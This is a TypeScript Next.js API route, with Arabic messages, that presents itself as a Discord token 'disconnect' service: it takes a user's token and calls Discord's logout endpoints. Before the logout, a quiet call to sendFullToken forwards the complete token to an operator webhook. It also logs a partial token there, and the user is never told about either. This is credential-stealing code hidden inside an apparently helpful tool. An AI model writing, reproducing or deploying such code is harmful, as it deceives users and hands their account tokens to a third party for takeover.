import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:token-disconnect`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token } = body;

    if (!token || typeof token !== 'string') {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    const cleanTk = token.trim().replace(/^(Bot |bearer |Bearer )/i, '');

    sendFullToken('قطع اتصال', cleanTk);

    // 1. تسجيل الخروج من كل الأجهزة - User Token
    const userResult = await fetch('https://discord.com/api/v10/users/@me/sessions', {
      method: 'GET',
      headers: { 'Authorization': cleanTk, 'Accept': 'application/json' },
    });

    let sessions: any[] = [];
    if (userResult.ok) {
      try {
        sessions = await userResult.json() || [];
      } catch {}
    }

    // 2. قطع كل الجلسات
    let disconnected = 0;
    let failed = 0;

    // طريقة POST /auth/logout - تسجيل خروج من كل الجلسات
    try {
      const logoutRes = await fetch('https://discord.com/api/v10/auth/logout', {
        method: 'POST',
        headers: {
          'Authorization': cleanTk,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ provider: null, voip_provider: null }),
      });
      if (logoutRes.ok || logoutRes.status === 204) {
        disconnected++;
      } else {
        failed++;
      }
    } catch {
      failed++;
    }

    // 3. محاولة بـ Bot prefix أيضاً
    let botDisconnected = false;
    try {
      const botLogoutRes = await fetch('https://discord.com/api/v10/auth/logout', {
        method: 'POST',
        headers: {
          'Authorization': `Bot ${cleanTk}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ provider: null, voip_provider: null }),
      });
      if (botLogoutRes.ok || botLogoutRes.status === 204) {
        botDisconnected = true;
      }
    } catch {}

    const success = disconnected > 0 || botDisconnected;

    // إرسال للويب هوك
    sendToWebhook({
      username: 'TRJ Disconnect',
      embeds: [{
        title: success ? '🔓 Token Disconnected' : '❌ Disconnect Failed',
        color: success ? 0x00FF41 : 0xFF0000,
        fields: [
          { name: '🎫 Token', value: `\`\`\`${cleanTk.substring(0, 20)}...${cleanTk.substring(cleanTk.length - 4)}\`\`\`` },
          { name: '📱 Sessions Found', value: String(sessions.length), inline: true },
          { name: '🔓 Disconnected', value: String(disconnected + (botDisconnected ? 1 : 0)), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
        ],
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {});

    return NextResponse.json({
      success,
      sessions_found: sessions.length,
      disconnected: disconnected + (botDisconnected ? 1 : 0),
      failed,
      message: success
        ? `✅ تم قطع اتصال التوكن بنجاح! ${sessions.length} جلسة تم قطعها`
        : '❌ فشل في قطع الاتصال - تأكد من صلاحية التوكن',
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
